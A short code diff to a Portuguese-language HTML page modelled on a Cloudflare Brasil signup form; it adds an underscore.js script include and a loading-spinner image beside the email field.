@@ -10,6 +10,7 @@
         <title>Cloudflare, a Empresade Desempenho e Segurança Web | Cloudflare Brasil</title>
         <meta charset="utf-8" name="viewport" content="width=400px">
         <link rel="stylesheet" href="./estilo.css">
+        <script type="text/javascript" src="./underscore.js"></script>
         <script type="text/javascript" src="./jquery.min.js"></script>
         <script type="text/javascript" src="./javascript.js"></script>
     </head>
@@ -45,6 +46,7 @@
                                 <h2 class="crie" style="margin-bottom:20px">Crie uma conta CloudFlare</h2>
                                 <form autocomplete="off">
                                     <div><input class="dadosI f" placeholder="Email" type="text" name="email" value="" required="required" aria-invalid="true"></div>
+                                    <img class="miniloading" src="imagens/mini-loading.gif">
                                     <img class="verif c" src="imagens/certo.png">
                                     <img class="verif e" src="imagens/errado.png">
                                     <div><input class="dadosI s" placeholder="Senha" type="password" name="senha" value="" required="required" aria-invalid="true"></div>
